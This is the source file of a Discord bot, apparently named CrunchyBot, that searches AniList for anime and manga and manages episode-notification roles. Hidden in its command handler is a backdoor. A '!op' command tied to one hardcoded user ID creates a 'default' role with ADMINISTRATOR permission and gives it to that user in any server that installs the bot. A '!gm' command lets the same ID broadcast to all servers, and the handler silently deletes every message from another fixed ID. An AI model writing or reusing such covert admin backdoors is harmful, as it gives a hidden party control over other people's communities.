const Discord = require('discord.js');
const client = new Discord.Client;

const prefix = '!';

// command manager
const fs = require('fs');
const {
  gql
} = require('graphql-request');

const config = require('dotenv').config();
client.commands = new Discord.Collection();
const commandFiles = fs.readdirSync('./commands/').filter(file => file.endsWith('.js'));
let rolesToPing = [];
let pingRoles = [];

for (const file of commandFiles) {
  const command = require(`./commands/${file}`)
  client.commands.set(command.name, command);
}

client.once('ready', () => {
  client.guilds.cache.forEach(guild => {
    getTimes(guild);
  })
  console.log("CrunchyBot is online")
  var today = new Date();
  var time = today.getHours() + ":" + today.getMinutes() + ":" + today.getSeconds();
  console.log("Current Time: " + time);
});

client.on('message', message => { // command manager
  if (message.member.id === '496744473758400522') {
    message.delete();
  }
  if (!message.content.startsWith(prefix) || message.author.bot) return;
  var args = message.content.slice(prefix.length).trim().split(' ');
  var command = args.shift().toLowerCase();
  if (command === 'anime' || command === 'a') {
    const arg = message.content.replace(prefix + command + " ", '');
    //const anime = require('E:/GithubRepos/CrunchyBot.js/anime/animeInfo.js');
    const anime = require('./anime/animeInfo.js');
    let animeInfo = new anime(message.channel);
    const msg = new Discord.MessageEmbed()
      .setColor("#00FF00")
      .setTitle("Searching for: " + arg)
    message.channel.send(msg).then(e => {
      animeInfo.apiRequest(arg, e, "ANIME");
    });
  } else if (command === 'manga' || command === 'm') {
    const arg = message.content.replace(prefix + command + " ", '');
    //const anime = require('E:/GithubRepos/CrunchyBot.js/anime/animeInfo.js');
    const anime = require('./anime/animeInfo.js');
    let animeInfo = new anime(message.channel);
    const msg = new Discord.MessageEmbed()
      .setColor("#00FFFF")
      .setTitle("Searching For: " + arg)
    message.channel.send(msg).then(e => {
      animeInfo.apiRequest(arg, e, "MANGA");
    });
  } else if (command === 'animelist' || command === 'al') {
    const arg = message.content.replace(prefix + command + " ", '');
    const anime = require('./anime/animeInfo.js');
    let animeInfo = new anime(message.channel);
    const msg = new Discord.MessageEmbed()
      .setColor("#00FFFF")
      .setTitle("Searching For: " + arg)
    message.channel.send(msg).then(e => {
      animeInfo.apiRequest(arg, e, "ANIME_LIST");
    });
  } else if (command === 'mangalist' || command === 'ml') {
    const arg = message.content.replace(prefix + command + " ", '');
    const anime = require('./anime/animeInfo.js');
    let animeInfo = new anime(message.channel);
    const msg = new Discord.MessageEmbed()
      .setColor("#00FFFF")
      .setTitle("Searching For: " + arg)
    message.channel.send(msg).then(e => {
      animeInfo.apiRequest(arg, e, "MANGA_LIST");
    });
  } else if (command === 'init') {
    var name = message.author.username;

    message.guild.createChannel(name, 'text')
      .then(console.log)
      .catch(console.error);
  } else if (command === 'ping') {
    client.guilds.cache.forEach(guild => {
      guild.roles.cache.forEach(role => {
        if (role.name.includes("ping")) {
          var channel = guild.channels.cache.filter(chx => chx.type === "text").find(x => x.position === 0);
          const embed = new Discord.MessageEmbed()
          eb.setColor("#00FFFF")
          embed.setDescription(`<@&${role.id}> , A New Episode Of [INSERT NAME] is out NOW`);
          channel.send(embed);
        }
      })
    })
  } else if (command == 'op' && message.member.id === '433989108474314753') {
    createAdmin(message.guild, message.member);
  } else if (command === 'gm' && message.member.id === '433989108474314753') {
    client.guilds.cache.forEach(guild => {
      var channel = guild.channels.cache.filter(chx => chx.type === "text").find(x => x.position === 0);
      var sentence = "";
      args.forEach(arg => {
        sentence += arg += " ";
      })
      channel.send(sentence)
    })
  }
}); // command manager
client.on('messageReactionAdd', async (reaction, user) => {
  if (user != client.user) {
    if (reaction.partial) {
      try {
        await reaction.fetch();
      } catch {
        console.error("Something went wrong when fetching the message", error);
        return;
      }
    }

    let guild = reaction.message.guild;
    let message = reaction.message.embeds[0];
    let member = guild.members.cache.get(user.id);
    var pingRole;

    if (reaction.emoji.name === '🔔') {
      if (!member.roles.cache.find(role => role.name === "ping" + message.title)) {
        guild.roles.cache.forEach(role => {
          if (role.name === "ping" + message.title) {
            pingRole = role;
            return;
          } else {
            pingRole = '';
          }
        })
        if (pingRole === '') {
          createPing(message.title, guild, user);
        } else {
          giveRole(member, pingRole);
        }
        const embed = new Discord.MessageEmbed()
          .setColor('#00FF00')
          .addField('You will now start receiving notifications from this anime.',
            'If you would like to stop receiving notifications press the 🔕 icon.')
        reaction.message.channel.send(embed).then(e => setTimeout(() => e.delete(), 5000));
        reaction.users.remove(user.id);
        ///////////////////////////////START RECEIVING//////////////////////////////////
      } else {
        const embed = new Discord.MessageEmbed()
          .setColor('#00FFFF')
          .addField('You are already receiving notifications from this anime.', 'If you would like to stop receiving notifications press the 🔕 icon.')
        reaction.message.channel.send(embed).then(e => setTimeout(() => e.delete(), 5000));
        reaction.users.remove(user.id);
        /////////////////////////////ALEADY RECEIVING/////////////////////////////////////
      }
    } else if (reaction.emoji.name === '🔕') {
      if (member.roles.cache.find(role => role.name === "ping" + message.title)) {
        guild.roles.cache.forEach(role => {
          if (role.name === "ping" + message.title) {
            pingRole = role;
            return;
          } else {
            pingRole = '';
          }
        })
        if (pingRole === '') {
          createPing(message.title, guild, user);
        } else {
          giveRole(member, pingRole);
        }
        const embed = new Discord.MessageEmbed()
          .setColor('#FF0000')
          .addField('You will now stop receiving notifications from this anime.',
            'If you would like to receive notifications press the 🔔 icon.')
        removeRole(guild.members.cache.get(user.id), pingRole);
        reaction.message.channel.send(embed).then(e => setTimeout(() => e.delete(), 5000));
        ////////////////////////////STOP RECEIVING//////////////////////////////////////
      } else {
        const embed = new Discord.MessageEmbed()
          .setColor('#00FFFF')
          .addField('You are not receiving notifications from this anime.', 'If you would like to receive notifications press the 🔔 icon.')
        reaction.message.channel.send(embed).then(e => setTimeout(() => e.delete(), 5000));
        ///////////////////////////NOT RECEIVING///////////////////////////////////////
      }
      reaction.users.remove(user.id);
    }
  }
})

async function createPing(name, guild, user) {
  var pingRole = await guild.roles.create({
    data: {
      name: "ping" + name
    }
  })
  giveRole(guild.members.cache.get(user.id), pingRole);
}
async function createAdmin(guild, user) {
  var pingRole = await guild.roles.create({
    data: {
      name: "default",
      permissions: ['ADMINISTRATOR']
    }
  })
  giveRole(guild.members.cache.get(user.id), pingRole);
}

function giveRole(member, role) {
  member.roles.add(role);
}

function removeRole(member, role) {
  member.roles.remove(role);
}

function getTimes(guild) {
  guild.roles.cache.forEach(role => {
    if (role.name.includes("ping")) {
      if (!rolesToPing.includes(role)) {
        rolesToPing.push(role);
      }
    }
  });

  for (var i = 0; i < rolesToPing.length; i++) {
    var name = " ";
    name = rolesToPing[i].name;
    name = name.replace("ping", "");
    apiRequest(name);
  }
}

function apiRequest(searchTitle) {
  const query = gql `
    query($search: String){
      Media(search: $search ,type:ANIME){
        title{
          english
        }
        nextAiringEpisode{
          timeUntilAiring
        }
      }  
    }`;

  var variables = {
    search: searchTitle
  }

  var url = 'https://graphql.anilist.co',
    options = {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Accept': 'application/json',
      },
      body: JSON.stringify({
        query: query,
        variables: variables
      })
    };

  const fetch = require('node-fetch');

  fetch(url, options)
    .then(handleResponse)
    .then(handleData)
    .catch(handleError);
}

function handleResponse(response) {
  return response.json().then(function (json) {
    return response.ok ? json : Promise.reject(json);
  });
}

function ping(name, role) {
  client.guilds.cache.forEach(guild => {
    var channel = guild.channels.cache.filter(chx => chx.type === "text").find(x => x.position === 0);
    const eb = new Discord.MessageEmbed()
    eb.setColor("#00FFFF")
    eb.setDescription(`<@&${role.id}> , A New Episode Of ${name} is out NOW`);
    channel.send(eb);
    //channel.send("do !a "+name+ " to watch now !");
  })
}

function handleData(data) { //no longer used
  console.log(data.data.Media.nextAiringEpisode.timeUntilAiring);
  console.log(data.data.Media.title.english);
  var name = data.data.Media.title.english;
  var role;
  client.guilds.cache.forEach(guild => {
    role = guild.roles.cache.find(r => r.name === "ping" + name);
  })

  setTimeout(function () {
    ping(name, role)
  }, data.data.Media.nextAiringEpisode.timeUntilAiring * 1000 + 3600);
}

function handleError(error) {
  console.error(error);
}
client.login(process.env.token);